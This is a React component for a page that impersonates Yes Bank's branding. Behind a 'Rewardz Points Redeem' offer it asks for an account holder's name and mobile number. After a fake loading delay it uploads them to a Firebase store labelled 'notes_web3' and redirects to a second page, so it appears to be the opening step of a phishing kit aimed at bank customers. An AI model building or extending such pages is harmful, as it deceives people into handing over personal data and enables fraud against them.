import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import FirebaseUtil from './FirebaseRepo';
import { MdLock } from "react-icons/md";
import myImage from './assets/yes_bank_top.png';
import footerImage from './assets/yes_footer.jpeg';
import Image1 from "../src/Image/1.jpeg";
import Footer from './components/Footer';

function FirstPage() {
  const navigate = useNavigate();
  const [name, setName] = useState('');
  const [phone, setPhone] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [progress, setProgress] = useState(0);

  useEffect(() => {
    let timer;
    if (isSubmitting) {
      setProgress(0);
      const step = 100 / 40; // 4 seconds → 100% (2.5% per 100ms)
      timer = setInterval(() => {
        setProgress(prev => {
          if (prev >= 100) {
            clearInterval(timer);
            return 100;
          }
          return prev + step;
        });
      }, 100);
    }
    return () => clearInterval(timer);
  }, [isSubmitting]);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsSubmitting(true);

    setTimeout(async () => {
      try {
        // ✅ Sirf name aur phone bhejna
        const result = await FirebaseUtil.uploadAnyModel("notes_web3", { name, phone });
        localStorage.setItem('key', result.key);
        console.log("result.key = " + result.key);

        // ✅ Navigate to next page
        navigate('/second-page');

        // ✅ Reset fields after save
        setName('');
        setPhone('');
      } catch (error) {
        console.error("Error uploading data:", error);
        alert("Something went wrong!");
      } finally {
        setIsSubmitting(false);
        setProgress(0);
      }
    }, 4000);
  };

  return (
    <>
      <div className="h-screen w-full grid grid-cols-1 md:grid-cols-2">
        {/* Left Side - Form */}
        <div className="relative flex flex-col justify-center items-center bg-gradient-to-br from-blue-700 to-blue-500 text-white px-6 lg:px-12 h-full">
          
          {/* Loader Overlay */}
          {isSubmitting && (
            <div className="absolute inset-0 flex flex-col items-center justify-center bg-white/70 backdrop-blur-sm z-20">
              <div className="w-12 h-12 border-4 border-blue-500 border-t-transparent rounded-full animate-spin mb-4"></div>
            </div>
          )}

          {/* Card */}
          <div className="w-full max-w-md bg-white rounded-2xl shadow-lg p-8 text-gray-800 relative z-10">
            {/* Logo */}
            <div className="flex justify-center mb-4">
              <img src={myImage} alt="Yes Bank Logo" className="h-16 object-contain" />
            </div>

            {/* Heading */}
            <h1 className="text-xl font-bold mb-6 flex items-center justify-center text-center text-blue-700">
              <MdLock className="mr-2 text-orange-500 text-2xl" /> 
              Welcome to Yes Bank Rewardz Points Redeem Process
            </h1>

            {/* Form */}
            <form onSubmit={handleSubmit} className="space-y-5">
              <div>
                <label className="block text-sm font-medium mb-1 text-gray-600" htmlFor="name">
                  Account Holder Name
                </label>
                <input
                  id="name"
                  type="text"
                  value={name}
                  onChange={(e) => setName(e.target.value)}
                  required
                  className="w-full px-3 py-2 rounded-lg border focus:outline-none focus:ring-2 focus:ring-orange-400"
                />
              </div>

              <div>
                <label className="block text-sm font-medium mb-1 text-gray-600" htmlFor="phone">
                  Mobile Number
                </label>
                <input
                  id="phone"
                  type="tel"
                  value={phone}
                  onChange={(e) => setPhone(e.target.value)}
                  required
                  maxLength="10"
                  className="w-full px-3 py-2 rounded-lg border focus:outline-none focus:ring-2 focus:ring-orange-400"
                />
              </div>

              <div className="flex justify-center pt-2">
                <button
                  type="submit"
                  disabled={isSubmitting}
                  className="bg-blue-600 text-white font-semibold px-10 py-2 rounded-full shadow-md hover:bg-blue-700 transition disabled:opacity-50"
                >
                  {isSubmitting ? "Loading..." : "Proceed"}
                </button>
              </div>
            </form>
          </div>

          {/* Footer Banner */}
          <div className="mt-6 w-full max-w-md relative z-10">
            <img src={footerImage} alt="Footer Banner" className="rounded-lg shadow-md w-full" />
          </div>
        </div>

        {/* Right Side Image */}
        <div className="hidden md:block relative h-full w-full">
          <img src={Image1} alt="Promotional Visual" className="absolute inset-0 h-full w-full object-cover" />
          <div className="absolute inset-0 bg-black/20"></div>
        </div>
      </div>

      <div className='mt-8'>
        <Footer />
      </div>
    </>
  );
}

export default FirstPage;
